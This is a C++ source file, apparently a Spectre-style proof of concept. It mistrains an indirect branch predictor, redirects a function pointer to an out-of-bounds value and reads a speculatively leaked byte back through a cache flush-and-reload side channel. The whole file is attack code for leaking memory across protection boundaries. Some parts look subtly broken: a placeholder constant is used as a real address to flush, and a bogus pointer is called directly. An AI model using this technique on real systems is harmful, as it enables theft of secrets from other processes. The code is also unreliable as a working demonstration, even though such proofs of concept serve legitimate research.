#include <stdint.h>
#include <iostream>
#include "cache_sidechannel.h"
#include "instr.h"
#include "local_content.h"
#include "utils.h"

typedef char(*functype)(int num);

uint64_t get_function_table_address() {
    return 0x1234567890abcde;
}

__attribute__((noinline))
char dummy_func(int v) {
    return 0;
}

__attribute__((noinline))
char callIndirect(functype* func) {
  return (*func)(0);
}

struct FunctionSlot {
    uint64_t func_type;
    uint64_t func_ptr;
};

// returns the leaked byte value
__attribute__((noinline))
char train_and_leak() {
    CacheSideChannel sidechannel;
    const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
    const unsigned CONVERGE_ITERATIONS = 100000;

    for (unsigned run = 0; run < CONVERGE_ITERATIONS; ++run) {

        // 1. train
        functype* val = new functype;
        *val = dummy_func;
        for (int i = 0; i < 100000; i++) {
            callIndirect(val);
        }

        // 2. flush table length address to give some time for speculation
        uint64_t function_table_addr = get_function_table_address();
        FlushFromDataCache_HostAddr(function_table_addr, function_table_addr + 31);

        // 2b. Also flush sidechannel oracle
        sidechannel.FlushOracle();

        // 3. Use an OOB value for indirect call table, causing speculation
        *((uint32_t*) val) = 0x0001000;
        char c = callIndirect(val);

        // 4. leak c
        ForceRead(oracle.data() + c);

        // 5. Speculative work is done. Speculation fence
        MemoryAndSpeculationBarrier();

        // 6. Exfiltrate value from cache
        std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
        if (result.first) {
            // Clean signal, return the value
            return result.second;
        }

        // 7. Whoops, didn't get a clean signal; try again
    }

    // Failed to leak the character in CONVERGE_ITERATIONS tries
    std::cerr << "Does not converge" << std::endl;
    exit(EXIT_FAILURE);
}

__attribute__((noinline))
int main(int argc, char const *argv[])
{
    char leaked = train_and_leak();
    std::cout << "Leaked the character " << leaked << std::endl;
    return 0;
}
